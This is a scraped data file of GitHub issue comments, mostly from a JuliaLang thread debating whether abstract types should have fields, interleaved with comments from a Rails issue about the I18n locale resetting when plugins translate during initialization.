julia/JuliaLang/4935/31878085,4935,"I would say I'm on the ""probably don't need this"" side. If it's really just saving some typing, I don't think it's worth it. I think not having this in addition to the great feature of no sub-typing concrete types makes for very legible code. I think it's been mentioned many times that one of Julia's strengths is the code readability and having a type's fields not be explicit seems like a bummer to me. Any time I see a type that sub-types, I then have to track down that type's parent, moving up the chain until I finally parse all the fields this type happens to inherit. That or use , which also feels a little clunky. ",,False
julia/JuliaLang/4935/31880918,4935,"Right, John, I see your point about minimal typing but my stance on this was to still require specifying the fields, which would completely undermine that benefit. I'm still not convinced of any design here that actually would reduce typing at all. ",,False
julia/JuliaLang/4935/31882161,4935,"ok, so if we don't need this how i would solve the problem i had that originally led me to this page? i am writing an api - say, for genetic algorithms - and i have a data structure (a type) that is passed to several functions.  this structure will contain information that the ""general"" genetic algorithm uses (a population, parameters describing how to breed, etc) and also some customizable information that the api user should add. so, when i write the library, i know some ""part"" of this data structure, but not others.  other parts will be extended by the library user.  for example, they might need to store some parameters that are needed to generate new individuals. at the function level, i can structure this just fine.  i write my ""general"" functions that do the tasks of breeding, etc.  the user writes functions (with a name i choose) that i call from my code when i want to create new instances (for example).  the user function is passed this same data structure. but at the type level, i don't understand how i can do this without what was described here.  i need to pre-define some fields, which are used by the library code.  the user needs to extend that with other fields after the library is written. if we don't have fields on abstract types, how do we solve the above elegantly? [what i ended up doing was adding a single field, which the user can extend.  so the user then defines their own structure and stores it there.  that works, but it seems clunky to me - for example, it makes extension by two parties at once difficult, since they must agree between themselves what this single extra thing is.  but maybe that's the best that is possible in julia.  i just wanted to set out a clear example in case people are missing a use case...] [i am also worried about ""Whether it's through a field or a function is much less important..."" since functions are not context-dependent in the same way as data (and closures cannot be assigned to package functions, as far as i can see).  in other words, if you're calling the library twice, how do you make functions specific to a particular call?] finally, i think a more formal way of saying the above is that this is the ""expression problem"" (wadler et al).  although i haven't looked at that in some time and may be wrong. ",,False
julia/JuliaLang/4935/31886415,4935,"I think the point is that one has to repeat the getter/setter methods for all(!) child types of an abstract type. Using this proposal one only need the abstract type definition with fields and is done. To @friend concern with the ""lost field"" when overriding. I think in most situations the overriden field is still in use. I use in C# properties a lot in the following way double myProperty; double MyProperty {   get { return myProperty; }   set    {     // perform a range check to look if value is in a valid range (e.g. &gt; 0)     myProperty = value;     // update some dependent properties   } }  In the combination with the GUI toolkit WPF these properties can be bound to GUI elements, which makes it very convenient in practice. Without this, the relevance of this feature might not be so high. ",,False
julia/JuliaLang/4935/31894186,4935,"The most specific version of a function gets called for each set of arguments. By defining a method for the abstract type, it will be used for all child types, unless there's an even more specific definition. ",,False
julia/JuliaLang/4935/31898941,4935,"As discussed earlier today with @friend A concrete example for which this could be useful would be to simplify defining methods for , , , , and a future hypothetical  matrix types. Each of these matrix types would require a field for the diagonal elements. Most of these would need also at least one sub/superdiagonal field, and quite possibly more. A hypothetical supertype of these particular matrix types would simplify the implementation of basic linear algebra functions. For example,  should retrieve the appropriate super/sub/diagonal field, or otherwise generate a zero vector of the correct length. ",,False
julia/JuliaLang/4935/31900231,4935,"I'll mention that a definition like this is valid, since we don't strictly check things Then each subtype just has to have a field of that name. ",,False
julia/JuliaLang/4935/31905711,4935,"I looked through this entire thread. I am still not convinced that abstract type with fields is necessary. I have worked on a dozen of Julia packages, and doesn't come across a single time where I want a super-type to enforce that all subtypes have to share some common fields. There are plenty of cases that one would want to enforce that all subtypes can provide information of some sort. However, all these can be done through (multi-dispatch) methods instead of fields. Requiring methods to be implemented is far more flexible than requiring the presence of a particular set of fields. The following example should illustrate this point. A common information that should be provided by all kinds of matrices is the number of rows &amp; columns. Then, should we do the following? Of course not. There are numerous ways to represent the shape, and using two integers is just one of them. For example, I can use a tuple or a vector, etc, or if I want to implement a SquareMatrix type, I can just use one integer to represent the shape. I think the current Julian way does this right -- it requires the size(a, d) method to be implemented instead of requiring what fields should be present. To me, fields are almost always about implementation details. Interface should be expressed using methods. Abstract types with fields are kind of making the fields part of the programming interface (API). I am yet to be convinced that this is a good idea. Using fields in abstract types also make things unnecessarily complicated. What if the subtype want the fields to be of different types than those being declared in the abstract type? ",,False
julia/JuliaLang/4935/31905898,4935,"People mentioned the usefulness to allow properties to be inherited. I agree with this. However, properties are more like methods than fields. ",,False
julia/JuliaLang/4935/31906120,4935,"In terms of saving typing, one can always use macros. If you find your self writing a lot of types that share a subset of fields, you can write a macro to generate those shared parts so that you don't have to repeat them many times. ",,False
julia/JuliaLang/4935/31906308,4935,I now agree this is a kind of marginal feature. It's easy to misuse; as you point out it's undesirable for read-only properties. ,,False
julia/JuliaLang/4935/31912957,4935,"@friend I wanted to come up with an example like that one that @friend provided, which I thought would not be possible. Is that pattern used anywhere in the Julia source code? In combination with field overloads this could be very interesting. One could provide default implementations on abstract types that make certain assumptions on the fields available. A concrete type either has provide the field or provide an equivalent field overload. I kind of agree with @friend that currenty methods are used as public interfaces while fields are implementation details. Making fields overloadable can break this view. Then the fields/properties can become part of the interface. In C# usually the convention is used that properties start with an upper case letter to make clear that this is part of the interface. I am actually not totally sure if we need properties in Julia. The nice thing about them is a) the point syntax b) that getter and setter have the same name. b) might not be that important in Julia as we have this nice ! notation. So one could define properties as wheel( car ) # gets the wheel wheel!( car, anotherWheel ) #sets the wheel in car ",,False
julia/JuliaLang/4935/31914678,4935,The dot syntax seems to be a really huge deal for many people. It is arguably one of the most popular bits of syntax among all modern languages. Modern languages need to support dot-oriented programming ) ,,False
julia/JuliaLang/4935/31915403,4935,"Well, from my point of view it is a plus that Julia does not support the dot syntax for member functions. But fields and properties are a different thing these are things that definately belong to an object. But on the other hand it would be kind of consequent to not allow field overloads and do all getters/setters with methods like I outlined above. Then one has a cleaner separation between what is an interface and what is the implementation detail ",,False
julia/JuliaLang/4935/31915833,4935,"I agree that many properties should be methods, like . I would like to add dot overloading, but I don't want to see a profusion of things like  as a replacement for these. ",,False
julia/JuliaLang/4935/31916892,4935,"If something like getfield(AMyAbstractType, Field{x}) = 0  can be done, then nothing stops one to start doing at the beginning of the code getfield{S}(oAny, Field{S}) = @friend $S($o)  and do a = [1 2; 3 4] a.size  everywhere. ( How I tested it abstract Field{S} getfield{S}(oAny, Type{Field{S}}) = @friend $S($o) a = [1 2; 3 4] getfield(a, Field{size})  ( When I first arrive at Julia, I tried to do something like that (because I though Julia dot syntax was broken D )) ",,False
julia/JuliaLang/4935/31916898,4935,That is the danger. The C# developer in me wants it but it will break the view that fields are implementation details. Maybe it needs a more well defined use case. I think @friend wanted this for pycall. ,,False
julia/JuliaLang/4935/31917591,4935,That hack fills me with dread. Not to mention that  would probably just break the whole system. ,,False
julia/JuliaLang/4935/31922402,4935,"If you give it a try, you'll see it works. (Images uses this technique.) There is no compile-time guarantee that the fields are there, but if they are not you'll get a clear run-time error, and to me that seems adequate. ",,False
julia/JuliaLang/4935/31924536,4935,"Yes, and I want it for the same reason in JavaCall. ",,False
julia/JuliaLang/4935/32106917,4935,"I had a few different implementations of an OrderedDict which were only slight modification of Base.Dict. One version (#2548) of this added an AbstractDict class above Dict and OrderedDict, which basically assumed that most of the current fields of Dict existed, and added two or three more for OrderedDicts. Jeff didn't like that at the time (see his comment in #2548), although without allowing fields in abstract types, that would probably be the most efficient way forward. ",,False
julia/JuliaLang/4935/33198345,4935,"I have another datapoint for a use case where this would be very handy. I think that the general concept is when the operations defined on the abstract type require some state to be attached to the object (which is what @friend mentioned above) In AudioIO.jl the audio processing is implemented by creating a graph of AudioNode subtypes that each implement their own  function to generate audio (e.g.  renders a sinusoid,  calls the render function on all of its inputs and mixes them together). I wanted to enable waiting on AudioNodes, so I implemented , which waits on a Condition stored with the object. In order to do this I had to track down all the concrete subtypes and add the condition field to all of them. That's manageable if they're all implemented in this module, but as the number of AudioNode types grows and possibly becomes split across different libraries it's infeasible to have to go in and add a field to all of them. Allowing fields on abstract types seems like a win in this case, but there are alternatives  Do what I'm doing now which is to manually define all required fields in each subtype. This is error-prone, it's easy to forget one, and it especially problematic across libraries Create a AudioNodeState type, and all subtypes are required to have a field . That way if I add behavior to AudioNode that requires some state I can add it to the AudioNodeState definition. This actually seems like a pretty good solution that's conceptually simple and explicit. There's only one thing for subtype implementers to remember, and if they forget to add the field it will get found out the first time any state is accessed. Add a macro that defines the proper fields. This feels more magical than  and doesn't seem to gain much. Make AudioNode a concrete parametric type with the specific renderer contained as a field within, like  This feels a little heavy/complicated, but probably worth trying on for size. Given that we have a couple of seemingly pretty-good options, I'm actually less convinced than I was before that fields on abstract types are the right fix for this problem. It seems like having fewer patterns to choose from is a good thing, and I definitely agree with @friend that the locality and explicitness of Julia type declarations makes the code a lot easier to read. Thanks @friend and @friend for the discussion and ideas today, which helped to crystalize a lot of this. ",,False
julia/JuliaLang/4935/33198915,4935,"I think the 2nd and the 4th alternatives are the most julian ones. And for this particular case, the 4th option seems to be the most meaningful. ",,False
julia/JuliaLang/4935/38521684,4935,"Somehow I hadn't seen this thread. I somewhat feel like most of the requests for it are from people writing inter-op code for these other languages. (although this is off-topic for this thread) Let's close this issue then. I've never felt it would be a significant savings in any of my code. And it further confuses the difference between the ""thing"" -- a  -- and the behavior -- the . If anything, I would propose trying to make those more distinct (but that's a different topic for later). ",,False
julia/JuliaLang/4935/39014385,4935,"Also late to the party ) One of the common use-cases put forward for fields on abstract types is to provide some base data and implementation that user code extends by derivation. But instead of derivation, isn't the Julian way to do this to make a generic type with the part the user adds being a type parameter. Then you separate the basic functionality and the extension parts cleanly, you properly express that the basic functionality can't be used without the extended functionality, you create an appropriate concrete type when its extended, and you even save typing ) ",,False
julia/JuliaLang/4935/39918651,4935,"instead of , what if this were reversed ? same underlying machinery, but the user can choose whether to inherit the fields or replace them (extending the fields is not allowed.  is not allowed). this avoids the two pitfalls of forcing the user to have fields they don't actually need and constructor dependencies. inner constructors would be inherited also i think this would make wrapping Gtk.jl much nicer and user-friendly, since Gtk has many of these inheritable concrete types. On the Julia side, most of these simply have a  field in julia (and an identical constructor), but a few of which have something else. ",,False
julia/JuliaLang/4935/39970113,4935,"An example of how this will be useful is in creating an . Julia immutable FinancialTimeSeries{T&lt;Float64,N} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type OrderBook{T&lt;ASCIIString,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type Blotter{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type FinancialPortfolio{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free blottersVector{Blotter} end type FinancialAccount{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free portfoliosVector{FinancialPortfolio} end ♠` Though I likely mucked up the syntax, the basic idea is that new custom time series types are easy to construct, and new fields can be added. ",,False
julia/JuliaLang/4935/39975009,4935,Would we allow new inner constructors in the derived type? Would  in the derived type invoke an inner constructor of the base type? ,,False
julia/JuliaLang/4935/39976547,4935,"Yes, I would think it useful to add invariants, but every derived type would at least have the abstract invariants, which includes the length of the time array matches size(values,1) and colnames matches size(values,2), as well as dates must be sequential and in descending order. ",,False
julia/JuliaLang/4935/40065432,4935,"just to be clear, my proposal explicitly disallows partial inheritance of fields. it is strictly limited to selectively allowing concrete types to be used as abstract type names. (with special syntax to indicate that the derived class has exactly the same fields and constructors as the original type) ",,False
julia/JuliaLang/4935/40132318,4935,"I think that we have considered abstract types with fields in the context of trying to solve a number of different problems, but looking at this discussion it seems to me that if they should be used for anything, it should be to address the cases where you would currently create either  a parametric type with a specialization field or (the subtype's data is a field in the supertype) a common type that would be used for the same named field in each of the subtypes (the supertype's data is a field in each subtype)  (alternatives 4 and 2 above from @friend respectively), because you want to create a family of types with some common storage and behavior. ",,False
julia/JuliaLang/4935/40133520,4935,"Once upon a time, there was an idea to disallow field access such as  in all cases except when the concrete type of  was statically known. If you didn't know the type of  when you wrote the code, how could you know what its fields signify? The way I understand it, this restriction was not implemented because it was deemed too useful to be able to have a family of types containing some same named fields. But this seems to be exactly what abstract types with fields would address! How about restricting field access like  to cases where it is statically known that  exists? The statically known type of  need not be concrete, as long as the fields in question would exist in it. To ensure the separation between abstract type and subtypes, access to the fields of the abstract type could require that that type be used, not just a subtype of it. This would give a complete namespace separation between the fields of the supertype and subtype. It could go a long way to avoiding the fragile base class problem, by forcing a proper interface between supertype and subtype. Of course, it remains to be defined what the statically known type of an expression would mean. ",,False
julia/JuliaLang/4935/40238479,4935,"Once we make  syntax overloadable then it will be just like writing . We never statically disallow generic function application, but this would be the only place in the language where we do that? That doesn't really make any sense. ",,False
julia/JuliaLang/4935/40272349,4935,"I will readily admit that I'm not at all convinced that this is the way forward. What troubles me most is  introducing and defining an entirely new mechanism in the language. Still, I find the idea interesting enough to investigate it a bit further I agree that we shouldn't statically disallow generic function application. Another way would be that, instead of having  as syntactic sugar for , to make it stand for getfield(a, Field(b), static_type_of_a)  where the last argument gives the static type that the field is looked up in. Actual fields would correspond to signatures like getfield(aA, Field(b), Type{A}) = ...  # implicitly created for field b in type A  so that they could only be accessed using the same type as they were defined in. Properties, on the other hand, could and probably would be made to apply for a range of static types, i.e. getfield(aA, Field(myproperty), Type) = ...   getfield{T&lt;MySuperType}(aA, Field(myproperty), Type{T}) = ...    to make them available regardless of static type, or given any static type  respectively. This is still different from the mechanisms that exist now. The reason to make it different would be that access to actual fields (not properties) is different - it is an implementation detail and not an interface. But I am still not sure whether it would be worth it. ",,False
julia/JuliaLang/4935/40281190,4935,"That's why this whole issue gives me pause. Inheritance in Julia is about behavior, not structure. And that's a good thing. Conflating inheritance of behavior and inheritance of structure is precisely the mistake that C++, Java, et al. have made and it causes all sorts of problems. It may make sense to introduce some mechanism for structural inheritance in Julia, but I don't think it should be confused with – or tied to – behavioral inheritance. ",,False
julia/JuliaLang/4935/40300112,4935,"Yes, I think you are right. If it shouldn't be tied to behavioral inheritance, then I guess it shouldn't be tied to subtyping at all. It would be interesting if we could come up with a way to address the family-of-similar-types problems that have been discussed here that is not tied to subtyping, but I suppose that this issue is not the forum to discuss it. ",,False
julia/JuliaLang/4935/40309190,4935,The distinction between inherited behavior and not structure is useful in navigating how to think about this problem. I was certainly getting lost in the thread before you spelled it out that way. ,,False
julia/JuliaLang/4935/40340113,4935,"In my point of view this PR is closely relate to #1974 and #5. If we decide field overloading should not be done this PR makes a lot more sense. While I agree about behavior vs. structure thing, there are cases like Gtk.jl as Jameson mentioned where abstract types with fields are handy. But #4935, #1974 and #5 should be seen in shared context. Abstract multiple inheritance and a way to define (and check) interfaces in a formal way is IMHO the most important of these issues. ",,False
julia/JuliaLang/4935/47390727,4935,"I'd like to point out that the decision to disallow concrete type inheritance may also be supported by the fact the in the c++ world inheriting from concrete types is considered conceptually problematic, too ""Item 33 Make non-leaf classes abstract"" ",,False
julia/JuliaLang/4935/47426980,4935,"@friend Coming from the c++ world I disagree. The design the author chooses from that article doesn't look like a good design to me, but I don't see how it argues against inheriting from concrete types. There are plenty of places in both the standard libraries, semi-official libraries (e.g. boost), and others which use inheritance. In fact if you don't allow inheritance from concrete types you essentially have Java's interfaces. There are many complaints you can find for why this can make for bad design. I understand the arguments against multiple inheritance with concrete types. That's why some languages like Ruby, Scala, and Swift have some concept of mix-ins. ",,False
julia/JuliaLang/4935/47428318,4935,"My view is that inheriting from concrete types is illogical. This fact then manifests itself as problems in various flavors depending on the language. Definitely the specific problem described in the c++ article does not affect Julia, but I thought it might be useful to provide a broader context for the question. The article is an excerpt from Scott Meyers ""More Effective C++"". In my opinion, it makes sense to subtype concrete types only if the subtype specifies a subset of the already given possible values of the type being subtyped. Subtyping Int64 to get the type of e.g. even numbers would be OK. I am for abstract types with fields and interfaces. ",,False
julia/JuliaLang/4935/47428512,4935,"I think many problems of various languages related to inheritance are due to not separating ""conceptual"" and implementation inheritance well enough. In this respect, Julia is in my opinion very well designed. Nevertheless, things like multiple abstract inheritance and interface specifications (of which fields in abstract types are a special case) would make the design more ""complete"". ",,False
rails/rails/703/904383,703,"Imported from Lighthouse. Original ticket at  by Nicolas Blanco - 2011-02-17 064814 UTC How to reproduce  Create a new Rails 3 beta 4 app, set the default_locale to fr (or whatever) in application.rb (and put the correct yml file). Run a rails console. Check that I18n.locale is the right default_locale you've just set. Now create a fake plugin  create a folder ""foo"" in vendor/plugins, create the file vendor/plugins/foo/init.rb with a call to I18n.translate in it, like  Run the Rails console in development mode and in production mode. In my case the locale is reset to en. This is a problem because many gems and plugins use I18n.t for example translating error messages in models... Note  this problem does not occur in Rails 2.3.x. ",,False
julia/JuliaLang/4935/47428699,4935,@friend but would you consider the fields to be part of a public or private interface? My take is that multiple abstract inheritance and public interface specifications are the most important issues to be solved in this area. Private interface specifications (which this issue is IMHO about) are neat but also make the language more complex. ,,False
rails/rails/703/1170350,703,"Imported from Lighthouse. Comment by Falk Pauser - 2010-08-18 154755 UTC I am using rails3-rc1 and have a similar issue. In config/application.rb I set config.i18n.default_locale = de after putting a de.yml into ""config/locales"". In development-mode everything is just fine, I18n.locale and I18n.default_locale return de in rails-console. At the production-server I18n.default_locale is de too, but I18n.locale gives en without any obvious reason... ",,False
julia/JuliaLang/4935/47432239,4935,@friend For Julia I'll agree with you (I think subclass from concretes works okay for languages like C++ and Python). I agree with your other statements. ,,False
rails/rails/703/1170351,703,"Imported from Lighthouse. Comment by Falk Pauser - 2010-08-19 084941 UTC Just tried the current ""3-0-stable"" branch - same effect. ",,False
julia/JuliaLang/4935/47432556,4935,"@friend  I might be wrong, but it seems like the private/public debate is a separate issue. You could assume for now everything is public without breaking anything. ",,False
rails/rails/703/1170352,703,Imported from Lighthouse. Comment by Nicolas Blanco - 2010-08-21 184704 UTC The only workaround I've found in to set the locale again in an initializer... bad... ,,False
julia/JuliaLang/4935/47435534,4935,"AFAIK, at the moment type-fields are considered private and the function-interface is public.  For instance, it's  and not . ",,False
rails/rails/703/1170353,703,"Imported from Lighthouse. Comment by cabgfx - 2010-09-11 161429 UTC Hi, I've experienced the same problem, with Rails 3.0.0. My app also bundles authlogic 2.1.6, which seems to cause the effect. I've fixed it for now, by brute-forcing config.i18n.locale = da, in /config/environments/production.rb. I'd assume this shouldn't be necessary, since I already have config.i18n.default_locale set in /config/application.rb ? This issue has also been discussed on the Google Group ",,False
julia/JuliaLang/4935/47437697,4935,"I don't think that the private/public debate is a separate issue. This is the key issue when we talk about overloading Note that this of course only applies to mutable types. For immutables, the fields are the public interface. ",,False
rails/rails/703/1170354,703,"Imported from Lighthouse. Comment by Robert Pankowecki - 2010-09-11 185240 UTC When 'rails c' is run you can see That is because you try to translate sth in plugin init.rb file and the translation is done until I18n configuration is fully loaded. Furthermore; using rails c shows that the available_locales' are cached in the I18n library the first time they are used as you can see. In other words Gem or plugin should not try to translate anything until all initializers are run. I would say it is gem/plugin or I18n fault, not rails. ",,False
julia/JuliaLang/4935/47440150,4935,"I can see where it is an issue for overloading the  operator, but is it also an issue for abstract types with fields? ",,False
rails/rails/703/1170355,703,Imported from Lighthouse. Comment by David Trasbo - 2010-09-11 211035 UTC I definitely agree with Robert. It's not Rails' fault and this can almost certainly be closed. ,,False
julia/JuliaLang/4935/47440897,4935,"There needs to be a separation between interface and implementation.  ATM they are the same thing, so any inheritance (meaning is-a) also would inherit the fields of the abstract type, an implementation artifact.  But the derived type may wish to provide a completely different implementation.   So the two things need to be separated.  That is where most languages fall down and Julia has the chance to get it right. ",,False
rails/rails/703/1170356,703,"Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 134533 UTC This is a sad attitude. This remembers me the way Grails developers treat their issues. They provide GORM for ORM but rely on Hibernate and when there is some issue with GORM the mark the issue as ""won't fix"" because this is Hibernate fault, not Grails' as if the user had the chance to use another framework with GORM. I18n is the only supported way of adding internationalization support to Rails. It just happens that it is a separate gem that Rails is taking advantage of, but if i18n is broken in Rails it doesn't mean it is not Rails fault and that issues should be marked as invalid. If the i18n gem is not good enough for Rails (which is not the case), then should think in another way of getting i18n in Rails. Not simply telling it doesn't care about i18n and it won't try to fix any related issues even if the source isn't exactly in rails repository. Besides that, it is not clear to me that this is a i18n issue instead of a Rails one. I still think the problem is in Rails, not on i18n itself. Rails should assure the order in which the calls are done to ensure the plugins will have i18n loaded before their initialization code gets executed... ",,False
rails/rails/703/1170357,703,"Imported from Lighthouse. Comment by Rohit Arondekar - 2010-09-12 140021 UTC Rodrigo, firstly I'm not a core member so the issue is not closed forever! ) Secondly, I apologize, I did rush through the ticket. Also I usually leave a friendly ""closing now, if you still think this is an issue then leave a comment and I'll reopen it"" comment while closing an issue. Assigning ticket to an author of the i18n gem for confirmation as to whether this is a i18n issue, gem/plugin issue or an issue with Rails. In the mean time if it's at all possible can you try writing a failing test for rails? That's usually the best way to demonstrate that it's a Rails issue. ",,False
julia/JuliaLang/4935/47450972,4935,"@friend You are absolutely right that interface and implementation have to be separated. If we say that only functions are the interface (e.g. , , ... of an AbstractArray) then the fields are implementation details. The abstract types with fields would however not really hurt this thinking. They would just be a convenient feature in some very OO-like situations. AbstractArray would not be such a thing. Personally I would avoid situations with deep inheritance hierarchies where abstract types with fields (heck we need an abbreviation for it ATWF) are really needed. But here we get into a subjective area and if @friend likes this programming style I don't really see the issue with this feature. ",,False
rails/rails/703/1170359,703,"Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 141339 UTC Hi Rohit, thank you for reopening the ticket. I've actually isolated the problem in June 14 (one day after my birthday ) ), in the Google Group discussion commented by cabgfx. We don't even need any plugin for reproducing the issue. I'm just not sure how to write some test of this kind. If someone could suggest me any approach (what subproject, and how to simulate Rails loading, preferencially in a fast way that won't impact too much on test run speed) I could try to write one... ",,False
julia/JuliaLang/4935/47451393,4935,"I think the following example is worth discussing We have an  type and want to extent it with physical dimensions Solution a) Introduce a new  type that has as field an ordinary  and a tuple of spacings. Problem We have to forward all the methods. Solution b) Let the entire  implementation ""open"" and define all the methods for the abstract type with fields . Then a trival concretization gives us our  type.  could now be derived from  in the same way ( with trivial concretization . While I am personally more a fan of solution a) I can absolutely understand that people also like b). It would certainly make the language a little larger. But I am not sure if this is such an issue at this front where it is hard to force people to use a certain programming style. ",,False
rails/rails/703/1170360,703,Imported from Lighthouse. Comment by Ryan Bigg - 2010-10-09 205519 UTC Automatic cleanup of spam. ,,False
julia/JuliaLang/4935/47455460,4935,"@friend, (a) seems like a more flexible approach, and with a  helper macro (#3292) it need not be so difficult as it is now. ",,False
rails/rails/703/1170361,703,Imported from Lighthouse. Comment by Roger Campos - 2011-02-25 224913 UTC This commit from Saimon Moore maybe should fix this ticket. ,,False
julia/JuliaLang/4935/47456926,4935,@friend I think issue #7442 shows a fair example of wanting abstract types with fields without having a deep hierarchy. Besides grouping (which requires a lot of boiler-plate functions) or copying of code (which violates DRY) I don't see a good way to implement those classes. ,,False
julia/JuliaLang/4935/47462524,4935,@friend I am absolutely in line with you. I am just not sure if this has a clear better / worse answer or if this is about taste. @friend is apparently of a different opinion and I was not able to convince him that (a) is a clean solution. ,,False
julia/JuliaLang/4935/47516249,4935,I think how well (a) works depends on the number of fields defined. In #7442 I tried both copying the variables and forwarding. Even with a small number of variables both involve writing a lot of extra code -- imagine the non-simplified version with many more fields. ,,False
julia/JuliaLang/4935/47522051,4935,"Abe, I know that we are going full circle now, but for completeness here is the version that uses the  relation. abstract Player  type PlayerFields   positionArray{Float64, 1}   rotationFloat64    end  type PlayerA &lt; Player   basePlayerFields   nameString   PlayerA() = new( PlayerFields([0.0, 0.0], pi),  ""foo"" ) end  type PlayerB &lt; Player    basePlayerFields    PlayerB(posArray{Float64, 1}, rotFloat64) = new(PlayerFields(pos, rot)) end  move!(playerPlayer, velocityArray{Float64, 1}, dtFloat64)   player.base.position += velocity*dt end  a = PlayerA() b = PlayerB([10.0, 10.0], -pi) move!(a, [0.1, -0.1], 0.1) move!(b, [0.1, -0.1], 0.1)  You might not like it but it seems that many Julia developers got used to this. Typically the  type is not so artifical but stands on its own. Just one other side note. In C++ inheriting from stl-containers is not encouraged. This has of course again specific C++ reasons but it is yet another example where  is favored. ",,False
julia/JuliaLang/4935/47533739,4935,"@friend You can do that (and I think that's also in #7442), but then you have to know that every player has a field named . This seems like something a compiler should enforce. You can get around that problem (also in #7442) by defining an interface with methods, but then you have a ton of extra code that you have to write. Both approach seem sub-optimal to me and a place where the compiler can help out. This could potentially provide better error messages, opportunities at optimization, and cleaner code. The thing with c++ is it that it tries very hard to be paradigm free. There are specific cases where you don't want inheritance. But it's no uncommon to employ inheritance with templates (especially template hacking). Most of the time you only ever want to use single inheritance, except for those times you really need multiple inheritance. I think that's what makes it such as successful language -- it tries not to impose its ideals on you (some Java did entirely incorrectly, IMHO). ",,False
julia/JuliaLang/4935/47561581,4935,"We generally take the approach that features that serve to constrain what the programmer can do are unimportant, while features that allow programmers to do more things more easily are very important. Arguing for features so that the compiler can prevent people from doing things is unlikely to be particularly persuasive around here – that's just not the Julian attitude. ",,False
julia/JuliaLang/4935/47602015,4935,"@friend I think this is very much the case of helping the user out, and I probably should not have used the word 'enforce'. I don't see how adding fields to abstract types would in any way constraint the user. ",,False
julia/JuliaLang/4935/47614543,4935,"Right, the feature part doesn't at all constrain the user. But, if the main point of the feature is to tell the programmer when they got something wrong, then that's the limitation thing again. I was all for this until I realized that all it saved was a bit of typing and means that a subtype of an abstract type with fields cannot not have those fields – and it's entirely plausible that a subtype might decide that it wants to store the fields that the supertype declared in a different way, such as part of the type or computed from other fields. This comes down to inheriting structure versus behavior. Inheriting structure is restrictive, while inheriting behavior is not. ",,False
julia/JuliaLang/4935/47615626,4935,"Agree with @friend plus one for not requiring subtypes to inherit fields. Given Julia's target market, fields being large arrays will be likely to naturally occur, so forcing subtypes to inherit them would be costly if the subtype doesn't need them. ",,False
julia/JuliaLang/4935/47615947,4935,"@friend, I'm a little confused by this point. Since I don't believe it will be possible to instantiate abstract types, it's not obvious to me how the size of arrays (a property of objects, not of types) could pass between abstract types and concrete types. Did I miss part of the conversation? ",,False
julia/JuliaLang/4935/47616450,4935,"@friend as I understand the discussion it is about allowing abstract types to have fields that can be inherited by subtypes and at some point a concrete type that can be instantiated with those fields. The point is that requiring the inheritance of such fields could be expensive if the field is an array, but the methods on the concrete type did not use that information, as @friend said. ",,False
julia/JuliaLang/4935/47647700,4935,"@friend But you can always choose not to put fields in the abstract type. It's only there if the design calls for it. @friend Likewise, if not all concrete types require that array, it shouldn't be in the abstract type. You should only have the fields that are common to all concrete types. If you use the grouping technique as suggested before (i.e. make another type that collects all common fields) you have the exact same problem. But if you don't group in a common type then you potentially have to copy and paste code in order to make sure no field name changes. ",,False
julia/JuliaLang/4935/47650815,4935,"@friend that presumes that a hierarchy is designed at one time by one group who ""control"" the entire hierarchy.  But one of the key things about Julia is the existence of a package system to publish such hierarchies for use by others. To the initial designer of the abstract type provided by a package it may make perfect sense to include fields in line with their initial use-case.  But Julia users can create their own subtypes adding implementations that the original abstract type designer never thought of. Forcing fields to be inherited may impose unreasonable costs on the new implementation.  But since some other users of the abstract type may use the inherited fields, they cannot simply be removed without breakage. It should be up to the subtype implementation to decide if it needs to inherit the fields from the parent type.  It is of course then the subtype implementer's responsibility to overload any parent method that uses fields they do not inherit. ",,False
julia/JuliaLang/4935/47765102,4935,"@friend That's true with many other languages besides Julia (e.g. Python and Ruby). A library could in theory do something like This gives the most flexibility as it  Doesn't impose fields in the way that you are worried about Provides a method to write more generalizable code (i.e. you know the fields exist in the method so you don't have to (a) check the existence of the field, or (b) deal with errors if the field doesn't exist).  ",,False
julia/JuliaLang/4935/47895265,4935,"I have a type named  that wants to reuse all the available methods in the  type found in the TimeSeries package. Here is the current  design needs some more information (stock ticker, tick size, currency, etc) so to achieve this there are three alternatives. The first one simply copies the  code and extends it. The only method that is reusable is the  method. metadataTimeArrayjulia immutable TimeArray{T,N,M} &lt; AbstractTimeSeries     timestampVector{Dates}     valuesArray{T,N}     colnamesVector{UTF8string}     metadataM end The problem with is nesting is that you would need to redefine  and other methods. This can be done with one-liners though So now we we have a nested type that includes a nested type. Does this cause a performance hit? I would imagine so but I haven't tried it to find out. ",,False
julia/JuliaLang/4935/47896801,4935,"@friend My point was that allowing fields in abstract types doesn't impose any constraints on the user. I don't think it's difficult to imagine a realistic example given in #7442 with 5-10 more fields, at which point the design you gave above becomes difficult to maintain if you have a decent number of  subtypes. One project I'm working on has just that. @friend also posted another example while I was typing my response. It may not come up a lot on the mailing lists, but I don't think that doesn't mean it isn't useful (or there aren't people who would use it). Also, multiple inheritance, which you have argued for (and I agree with), only shows a handful of hits when I search on the Julia user list. The problem with using methods to define the public interface is that the compiler isn't doing any checks for you. Sure, you know the method exists, but you don't know if the subtypes actually have fields you are accessing. Thus, you will only find the error at runtime, and are therefore just moving the problem around, but not actually solving it. ",,False
julia/JuliaLang/4935/47930916,4935,"@friend What about this abstract AbstractTimeSeries  immutable AbstractTimeSeriesFields{T,N}     timestampVector{Dates}     valuesArray{T,N}     colnamesVector{UTF8string}     end  # Now there are all the methods that operate on an AbstractTimeSeries # they assume that every AbstractTimeSeries has a field ""base"" of type AbstractTimeSeriesFields # One example follow  length(tAbstractTimeSeries) = length(t.base.timestamp) # don't no if this is the correct length... but you get the idea  immutable TimeArray{T,N} &lt; AbstractTimeSeries     base{T,N}     # Might need a ""nicer"" constructor that hides AbstractTimeSeriesFields end  # Despite the constructor TimeArray needs 0 new methods  immutable FinancialTimeSeries{T,N} &lt; AbstractTimeSeries     base{T,N}     stockStock     # Might need a ""nicer"" constructor that hides AbstractTimeSeriesFields end  # Again all the AbstractTimeSeries methods are automatically available.  I don't think that there will be any performance hit in the indirection but if you are concerned about speed you have to benchmark it. ",,False
